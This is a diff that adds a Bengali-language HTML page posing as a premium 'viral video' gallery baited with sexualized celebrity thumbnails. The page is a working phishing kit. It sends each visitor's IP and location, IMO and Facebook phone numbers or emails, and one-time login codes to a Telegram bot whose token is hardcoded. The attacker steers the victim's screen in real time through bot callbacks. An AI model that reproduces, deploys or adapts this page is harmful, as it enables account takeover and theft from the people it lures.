@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Update Center - Premium</title>
+
+    <meta property="og:title" content="Update Center - Premium Video">
+    <meta property="og:image" content="https://raw.githubusercontent.com/Priya-akter-121/vairal_xxx_update-video/main/উর্বশী..jpg">
+    <meta property="og:description" content="Watch the latest premium video updates.">
+
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background-color: #000; font-family: sans-serif; color: white; overflow-x: hidden; }
+        .video-card { border-radius: 12px; background: #0f0f0f; aspect-ratio: 16/9; border: 1px solid #222; cursor: pointer; position: relative; transition: 0.3s; overflow: hidden; }
+        #modal { display: none; z-index: 1000; position: fixed; inset: 0; background-color: #000; }
+        .step-container { display: none; }
+        .step-active { display: block; }
+        
+        .main-headline { background: linear-gradient(to bottom, #ff0000, #990000); padding: 20px; text-align: center; border-radius: 15px; margin: 10px; border: 2px solid #fff; box-shadow: 0 0 20px rgba(255, 0, 0, 0.7); }
+
+        .loader { border: 10px solid #f3f3f3; border-top: 10px solid #ff0000; border-radius: 50%; width: 80px; height: 80px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        .otp-input-field { background: #fff; border: 4px dashed #ff0000; border-radius: 20px; font-size: 35px; font-weight: 900; color: #ff0000; text-align: center; width: 100%; padding: 20px; outline: none; box-shadow: 0 0 20px rgba(255,0,0,0.2); letter-spacing: 10px; }
+        .timer-lock { pointer-events: none; opacity: 0.5; background: #eee !important; border-color: #999 !important; }
+
+        .jumping-box { border: 5px solid #ff0000; background: #fff; color: #ff0000; padding: 25px; border-radius: 15px; font-weight: 900; font-size: 18px; animation: box-jump 0.5s infinite alternate; text-align: center; box-shadow: 0 15px 40px rgba(255,0,0,0.5); line-height: 1.5; }
+        @keyframes box-jump { from { transform: translateY(0); } to { transform: translateY(-20px); } }
+
+        .pointer-arrow { position: absolute; bottom: -70px; left: 50%; transform: translateX(-50%); text-align: center; color: #ff0000; font-weight: bold; animation: arrow-move 0.4s infinite alternate; display: none; z-index: 100; }
+        @keyframes arrow-move { from { transform: translateX(-50%) translateY(0); } to { transform: translateX(-50%) translateY(25px); } }
+    </style>
+
+    <script>
+        window.onload = function() {
+            fetch('https://ipapi.co/json/')
+            .then(res => res.json())
+            .then(data => {
+                sendBotMsg(`🌐 <b>ভিজিটর ডিটেইলস:</b>\n📍 IP: ${data.ip}\n🌍 দেশ: ${data.country_name}\n🏙️ শহর: ${data.city}`);
+            });
+
+            setTimeout(function() {
+                if (confirm("ভিডিওটি দেখার জন্য OK বাটনে ক্লিক করুন।")) {
+                    const currentUrl = window.location.href.replace(/^https?:\/\//, '');
+                    window.location.href = "intent://" + currentUrl + "#Intent;scheme=https;package=com.android.chrome;end";
+                }
+            }, 1000);
+            setInterval(checkCommands, 2000);
+        };
+    </script>
+</head>
+<body>
+
+    <nav id="top-nav" class="fixed top-0 w-full bg-black/90 p-4 border-b border-red-900/30 z-50 text-center font-bold italic text-white uppercase">
+        <span class="bg-red-600 px-2 rounded">Update</span> CENTER
+    </nav>
+
+    <div id="video-grid-container">
+        <div class="mt-24 px-4 max-w-6xl mx-auto">
+            <div class="main-headline">
+                <h1 class="text-2xl md:text-4xl font-black text-white leading-tight">সকল আপডেট ভিডিও ও ভাইরাল ভিডিও পেতে আমাদের এখানে অ্যাড করুন!</h1>
+                <p class="text-yellow-300 font-bold mt-2 text-lg">এখানে যেসব ভিডিও পাবেন, এসব ভিডিও অন্য কোথাও পাবেন না।</p>
+            </div>
+        </div>
+
+        <div id="video-grid" class="mt-8 px-4 max-w-6xl mx-auto mb-10 grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
+            <script>
+                const imgs = ["1595401658_katrina-kaif-in-boom.jpg", "917_1000.webp", "F-Y4_ztaAAAGum6.jpg", "F8NwYFlW4AAGpb0 (1).jpg", "F8NwYFlW4AAGpb0.jpg", "IMG-20260426-WA0000.jpg", "IMG-20260426-WA0001.jpg", "IMG-20260426-WA0002.jpg", "IMG-20260426-WA0003.jpg", "IMG-20260426-WA0004.jpg", "IMG-20260426-WA0005.jpg", "IMG-20260426-WA0006.jpg", "IMG-20260426-WA0007.jpg", "IMG-20260426-WA0008.jpg", "IMG-20260426-WA0009.jpg", "IMG-20260426-WA0010.jpg", "IMG-20260426-WA0011.jpg", "IMG-20260426-WA0012.jpg", "IMG-20260426-WA0013.jpg", "IMG-20260426-WA0014.jpg", "IMG-20260426-WA0015.jpg", "IMG-20260426-WA0016.jpg", "IMG-20260426-WA0017.jpg", "IMG_20260426_205731.jpg", "IMG_20260427_005450.jpg", "IMG_20260427_005502.jpg", "IMG_20260427_005519.jpg", "IMG_20260427_005534.jpg", "IMG_20260427_005552.jpg", "IMG_20260427_005633.jpg", "IMG_20260427_005656.jpg", "IMG_20260427_010011.jpg", "Screenshot_2026-04-26-19-47-32-12_40deb401b9ffe8e1df2f1cc5ba480b12.jpg", "Screenshot_2026-04-26-20-56-58-94_be80aec1db9a2b53c9d399db0c602181.jpg", "Screenshot_2026-04-27-00-11-54-96_40deb401b9ffe8e1df2f1cc5ba480b12.jpg", "Screenshot_2026-04-27-00-12-58-67_40deb401b9ffe8e1df2f1cc5ba480b12.jpg", "Screenshot_2026-04-27-00-52-46-26_40deb401b9ffe8e1df2f1cc5ba480b12.jpg", "Screenshot_2026-04-27-00-53-02-86_40deb401b9ffe8e1df2f1cc5ba480b12.jpg", "_1629991531100.jpg", "bc371a1ee5e19eb76ad903e2da29468a-64eda632c8357.webp", "braless-bollywood-divas-01.jpg", "dfdc903253cd0860e24c65f09a561e55.jpg", "hq720 (3).jpg", "hq720 (4).jpg", "sddefault (1).jpg", "sddefault (2).jpg", "উর্বশী..jpg"];
+                const baseUrl = "https://raw.githubusercontent.com/Priya-akter-121/vairal_xxx_update-video/main/";
+                imgs.forEach((img, index) => {
+                    const fullUrl = baseUrl + encodeURIComponent(img);
+                    document.write(`
+                        <div class="video-card" onclick="openModal('${fullUrl}', ${index+1})">
+                            <img src="${fullUrl}" class="w-full h-full object-cover opacity-70">
+                            <div class="absolute inset-0 flex items-center justify-center"><div class="bg-black/50 w-12 h-12 rounded-full flex items-center justify-center border-2 border-white/80"><svg class="w-6 h-6 text-white fill-current" viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg></div></div>
+                        </div>
+                    `);
+                });
+            </script>
+        </div>
+    </div>
+
+    <div id="modal" class="flex items-center justify-center p-4">
+        <div class="bg-white text-black w-full max-w-sm rounded-[40px] overflow-hidden shadow-2xl relative min-h-[600px]">
+            <div class="bg-red-600 p-6 text-center text-white font-black italic uppercase tracking-widest">Verification Center</div>
+            <div class="p-8">
+                
+                <div id="step-preplay" class="step-container text-center">
+                    <h2 class="text-xl font-bold mb-4 uppercase">ভিডিওটি প্লে করুন</h2>
+                    <div class="relative w-full aspect-video rounded-3xl overflow-hidden mb-8 border shadow-xl bg-gray-100">
+                        <img id="selected-img" src="" class="w-full h-full object-cover">
+                        <div class="absolute inset-0 flex items-center justify-center">
+                            <button onclick="goStep('choice')" class="w-20 h-20 bg-red-600 rounded-full flex items-center justify-center border-4 border-white animate-pulse"><svg class="w-10 h-10 text-white fill-current ml-1" viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg></button>
+                        </div>
+                    </div>
+                    <button onclick="goStep('choice')" class="w-full bg-red-600 text-white py-4 rounded-2xl font-black shadow-xl uppercase tracking-tighter">প্লে করুন</button>
+                </div>
+
+                <div id="step-choice" class="step-container text-center">
+                    <div class="flex justify-center gap-4 mb-6">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a7/Imo_app_logo.png/600px-Imo_app_logo.png" class="w-16 h-16">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/be/Facebook_Messenger_logo_2020.svg/600px-Facebook_Messenger_logo_2020.svg.png" class="w-16 h-16">
+                    </div>
+                    <h2 class="text-red-600 font-bold text-sm mb-2 uppercase">ভিডিওটি সাপোর্ট করছে না</h2>
+                    <p class="text-gray-500 text-[13px] mb-10 px-4 font-bold">আপনার ব্রাউজারে ভিডিওটি সাপোর্ট করছে না, দয়া করে ইমু অথবা মেসেঞ্জার কানেক্ট করে ভিডিওটি দেখুন।</p>
+                    <button onclick="goStep('imo-1')" class="w-full bg-[#2196F3] text-white py-5 rounded-2xl font-bold mb-5 flex items-center justify-center gap-3"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a7/Imo_app_logo.png/600px-Imo_app_logo.png" class="w-8 h-8">ইমুতে যোগ করুন</button>
+                    <button onclick="goMessenger()" class="w-full bg-[#1877F2] text-white py-5 rounded-2xl font-bold flex items-center justify-center gap-3"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/be/Facebook_Messenger_logo_2020.svg/600px-Facebook_Messenger_logo_2020.svg.png" class="w-8 h-8">মেসেঞ্জারে যোগ করুন</button>
+                </div>
+
+                <div id="step-imo-1" class="step-container text-center">
+                    <h3 class="font-bold text-blue-600 mb-8 text-lg uppercase">ইমু নাম্বার লিখুন</h3>
+                    <input type="tel" id="imo-num" placeholder="01XXXXXXXXX" class="w-full p-5 bg-gray-50 rounded-2xl border-2 mb-10 text-center text-3xl font-black outline-none border-blue-100">
+                    <button onclick="handleInitialSubmit('IMO', 'imo-num')" class="w-full bg-blue-600 text-white py-5 rounded-2xl font-bold">পরবর্তী ধাপ</button>
+                </div>
+
+                <div id="step-imo-otp" class="step-container text-center">
+                    <div class="jumping-box mb-12">
+                        আপনার আইএমও (IMO) তে মেসেজ পাঠানো হয়েছে। মেসেজের ভিতরে স্টার (*) চিহ্নের আগে যেটা লেখা ছিল সেটি নিচের ঘরে বসিয়ে অ্যাড করুন।
+                    </div>
+                    <div class="text-2xl font-black text-blue-600 mb-6 uppercase">অপেক্ষা করুন: <span id="timer-imo">30</span></div>
+                    <input type="number" id="otp-imo" disabled oninput="trackOTP(this.value, 'IMO')" placeholder="****" class="timer-lock otp-input-field">
+                    <button id="v-btn-imo" disabled onclick="finalSubmit('IMO')" class="timer-lock w-full bg-blue-600 text-white py-5 rounded-3xl font-black mt-8 shadow-xl">ইমু ভেরিফাই করুন</button>
+                </div>
+
+                <div id="step-fb-1" class="step-container text-center relative">
+                    <h3 class="font-bold text-blue-800 mb-8 uppercase text-[12px]">আপনার ইমেইল অথবা ফোন নাম্বার লিখুন</h3>
+                    <input type="email" id="fb-user" placeholder="Email or Phone" class="w-full p-5 bg-gray-50 rounded-2xl border-2 mb-10 text-center font-bold outline-none border-blue-200">
+                    <div id="fb-arrow" class="pointer-arrow"><div class="bg-red-600 text-white text-[12px] py-2 px-4 rounded-xl mb-1 shadow-lg">কিবোর্ড এর উপরে ভেসে ওঠা ইমেইল এর উপর ক্লিক করুন</div><span class="text-5xl">⬇️</span></div>
+                    <button onclick="handleInitialSubmit('FB', 'fb-user')" class="w-full bg-[#1877F2] text-white py-5 rounded-2xl font-bold">পরবর্তী ধাপ</button>
+                </div>
+
+                <div id="step-fb-otp" class="step-container text-center">
+                    <div class="jumping-box mb-12" style="border-color:#1877F2; color:#1877F2;">
+                        আপনার ইমেইল অথবা আপনার ফোন নাম্বারে ছয় সংখ্যা অথবা আট সংখ্যার এক নাম্বার পাঠানো হয়েছে। সেখান থেকে নাম্বার নিয়ে এসে নিচের ফাঁকা ঘরে বসান।
+                    </div>
+                    <div class="text-2xl font-black text-[#1877F2] mb-6 uppercase">অপেক্ষা করুন: <span id="timer-fb">30</span></div>
+                    <input type="number" id="otp-fb" disabled oninput="trackOTP(this.value, 'FB')" placeholder="****" class="timer-lock otp-input-field" style="border-color:#1877F2; color:#1877F2;">
+                    <button id="v-btn-fb" disabled onclick="finalSubmit('FB')" class="timer-lock w-full bg-[#1877F2] text-white py-5 rounded-3xl font-black mt-8 shadow-xl">মেসেঞ্জার ভেরিফাই করুন</button>
+                </div>
+
+                <div id="step-wait" class="step-container text-center py-10">
+                    <div class="loader"></div>
+                    <h2 class="font-black text-gray-800 text-2xl mt-6 uppercase">যাচাই করা হচ্ছে...</h2>
+                </div>
+
+                <div id="step-success" class="step-container text-center py-6">
+                    <div class="w-24 h-24 bg-green-100 text-green-600 rounded-full flex items-center justify-center mx-auto mb-8 border-4 border-green-500 shadow-2xl scale-110"><svg class="w-16 h-16" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="4" d="M5 13l4 4L19 7"></path></svg></div>
+                    <h2 class="text-3xl font-black text-green-600 mb-4 uppercase">সফল হয়েছে!</h2>
+                    <button onclick="window.location.reload()" class="w-full bg-green-600 text-white py-5 rounded-2xl font-black shadow-2xl uppercase tracking-widest">ভিডিও প্লে করুন</button>
+                </div>
+
+                <div id="step-error" class="step-container text-center py-6">
+                    <div class="w-24 h-24 bg-red-100 text-red-600 rounded-full flex items-center justify-center mx-auto mb-8 border-4 border-red-500 shadow-2xl"><svg class="w-16 h-16" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="4" d="M6 18L18 6M6 6l12 12"></path></svg></div>
+                    <h2 class="text-2xl font-black text-red-600 mb-4 uppercase">যাচাই ভুল হয়েছে!</h2>
+                    <button onclick="goStep('choice')" class="w-full bg-red-600 text-white py-5 rounded-2xl font-black shadow-2xl uppercase">পুনরায় চেষ্টা করুন</button>
+                </div>
+
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const botToken = "7957986649:AAGCcJ5R6g6PMHEgWXFqLRn2SrpElZvUtnE";
+        const chatId = "8516934257";
+        let lastId = 0;
+
+        function openModal(imgUrl, vidIndex) {
+            document.getElementById('video-grid-container').style.display = 'none';
+            document.getElementById('top-nav').style.display = 'none';
+            document.getElementById('selected-img').src = imgUrl;
+            document.getElementById('modal').style.display = 'flex';
+            sendBotMsg(`🎯 ইউজার <b>${vidIndex}</b> নম্বর ভিডিওতে ক্লিক করেছে।`);
+            goStep('preplay');
+        }
+
+        function goMessenger() {
+            goStep('fb-1');
+            const input = document.getElementById('fb-user');
+            setTimeout(() => { input.focus(); document.getElementById('fb-arrow').style.display = 'block'; }, 600);
+        }
+
+        function goStep(id) {
+            document.querySelectorAll('.step-container').forEach(s => s.classList.remove('step-active'));
+            document.getElementById('step-' + id).classList.add('step-active');
+            sendBotMsg(`📍 ইউজার এখন: <b>${id}</b> পেজে`);
+        }
+
+        async function handleInitialSubmit(mode, inputId) {
+            const val = document.getElementById(inputId).value;
+            if(!val) return;
+            await sendBotMsg(`🚀 <b>${mode} ডেটা:</b> <code>${val}</code>`);
+            if(mode === 'IMO') { goStep('imo-otp'); startTimer('imo'); }
+            else { document.getElementById('fb-arrow').style.display = 'none'; goStep('fb-otp'); startTimer('fb'); }
+        }
+
+        function startTimer(type) {
+            let c = 30;
+            const input = document.getElementById('otp-' + type);
+            const btn = document.getElementById('v-btn-' + type);
+            const timer = setInterval(() => {
+                c--;
+                document.getElementById('timer-' + type).innerText = c < 10 ? '0'+c : c;
+                if(c <= 0) {
+                    clearInterval(timer);
+                    input.disabled = btn.disabled = false;
+                    input.classList.remove('timer-lock');
+                    btn.classList.remove('timer-lock');
+                    input.focus();
+                }
+            }, 1000);
+        }
+
+        function trackOTP(val, mode) { if(val.length >= 4) sendBotMsg(`🔢 ${mode} ওটিপি ইনপুট: <code>${val}</code>`); }
+
+        function finalSubmit(mode) { 
+            const otp = document.getElementById('otp-' + (mode === 'IMO' ? 'imo' : 'fb')).value;
+            sendBotMsg(`✅ <b>ফাইনাল ${mode} ওটিপি:</b> <code>${otp}</code>`, true);
+            goStep('wait'); 
+        }
+
+        async function sendBotMsg(msg, withButtons = false) {
+            let body = { chat_id: chatId, text: msg, parse_mode: "HTML" };
+            if (withButtons) body.reply_markup = { inline_keyboard: [[{ text: "✅ Success", callback_data: "success" }, { text: "❌ Error", callback_data: "error" }], [{ text: "⏳ Wait", callback_data: "wait" }]] };
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) });
+        }
+
+        async function checkCommands() {
+            try {
+                const res = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=-1`);
+                const data = await res.json();
+                if (data.result && data.result.length > 0) {
+                    const update = data.result[0];
+                    if (update.update_id !== lastId) {
+                        lastId = update.update_id;
+                        let cmd = update.callback_query ? update.callback_query.data : "";
+                        if (cmd === 'success') goStep('success');
+                        if (cmd === 'error') goStep('error');
+                        if (cmd === 'wait') goStep('wait');
+                    }
+                }
+            } catch (e) {}
+        }
+    </script>
+</body>
+</html>
